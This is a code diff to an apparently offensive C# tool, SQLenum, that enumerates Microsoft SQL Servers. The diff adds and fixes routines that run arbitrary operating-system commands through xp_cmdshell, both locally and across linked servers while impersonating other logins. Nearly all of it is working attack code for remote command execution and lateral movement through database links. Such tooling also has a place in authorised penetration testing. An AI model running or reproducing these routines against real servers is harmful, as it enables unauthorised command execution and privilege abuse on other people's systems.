@@ -383,6 +383,25 @@ namespace SQLenum
             }
             reader.Close();
 
+            if (commandExecution == true)
+            {
+                try
+                {
+                    Console.WriteLine("\n=====Executing commands using current context on " + args[0] + "=====");
+
+                    String execRemoteCmd = "EXEC xp_cmdshell '" + remoteCommands + "';";
+                    command = new SqlCommand(execRemoteCmd, con);
+                    reader = command.ExecuteReader();
+                    Console.WriteLine("Remote commands executed.");
+                    reader.Close();
+                }
+                catch (Exception e)
+                {
+                    Console.WriteLine("[Error]" + e.Message);
+                    Console.WriteLine("Command execution using current context on " + args[0] + " failed");
+                }
+            }
+
             //Enumeration on remote linked SQL server
             if (linkEnumeration == true)
             {
@@ -517,7 +536,7 @@ namespace SQLenum
                             {
                                 Console.WriteLine("\n=====Executing commands using impersonated context " + args[0] + "\\" + localImpersonatedLogin + " on " + args[0] + " and " + args[1] + "\\" + remoteImpersonatedLogin + " on " + args[1] + "=====");
 
-                                String execRemoteCmd = "EXEC('execute(''EXEC(''''xp_cmdshell ''''''''" + remoteCommands + "'''''''';''''); RECONFIGURE;'') as login = ''" + remoteImpersonatedLogin + "'';') as login = '" + localImpersonatedLogin + "' AT " + args[1] + ";";
+                                String execRemoteCmd = "EXEC('execute(''EXEC(''''xp_cmdshell ''''''''" + remoteCommands + "'''''''';'''');'') as login = ''" + remoteImpersonatedLogin + "'';') as login = '" + localImpersonatedLogin + "' AT " + args[1] + ";";
                                 command = new SqlCommand(execRemoteCmd, con);
                                 reader = command.ExecuteReader();
                                 Console.WriteLine("Remote commands executed.");
@@ -864,7 +883,7 @@ namespace SQLenum
                             {
                                 Console.WriteLine("\n=====Executing commands using impersonated context " + args[0] + "\\" + localImpersonatedLogin + " on " + args[1] + "=====");
 
-                                String execRemoteCmd = "EXEC('EXEC(''xp_cmdshell ''''" + remoteCommands + "'''';''); RECONFIGURE;') as login = '" + localImpersonatedLogin + "' AT " + args[1] + ";";
+                                String execRemoteCmd = "EXEC('EXEC(''xp_cmdshell ''''" + remoteCommands + "'''';'');') as login = '" + localImpersonatedLogin + "' AT " + args[1] + ";";
                                 command = new SqlCommand(execRemoteCmd, con);
                                 reader = command.ExecuteReader();
                                 Console.WriteLine("Remote commands executed.");
@@ -1227,7 +1246,7 @@ namespace SQLenum
                             {
                                 Console.WriteLine("\n=====Executing commands using current context on " + args[1] + "=====");
 
-                                String execRemoteCmd = "EXEC('EXEC(''xp_cmdshell ''''" + remoteCommands + "'''';''); RECONFIGURE;') AT " + args[1] + ";";
+                                String execRemoteCmd = "EXEC('EXEC(''xp_cmdshell ''''" + remoteCommands + "'''';'');') AT " + args[1] + ";";
                                 command = new SqlCommand(execRemoteCmd, con);
                                 reader = command.ExecuteReader();
                                 Console.WriteLine("Remote commands executed.");
@@ -1367,7 +1386,7 @@ namespace SQLenum
                             {
                                 Console.WriteLine("\n=====Executing commands using impersonated context " + args[1] + "\\" + remoteImpersonatedLogin + " on " + args[1] + "=====");
 
-                                String execRemoteCmd = "EXEC('execute as login = ''" + remoteImpersonatedLogin + "''; EXEC(''xp_cmdshell ''''" + remoteCommands + "'''';''); RECONFIGURE;') AT " + args[1] + ";";
+                                String execRemoteCmd = "EXEC('execute as login = ''" + remoteImpersonatedLogin + "''; EXEC(''xp_cmdshell ''''" + remoteCommands + "'''';'');') AT " + args[1] + ";";
                                 command = new SqlCommand(execRemoteCmd, con);
                                 reader = command.ExecuteReader();
                                 Console.WriteLine("Remote commands executed.");
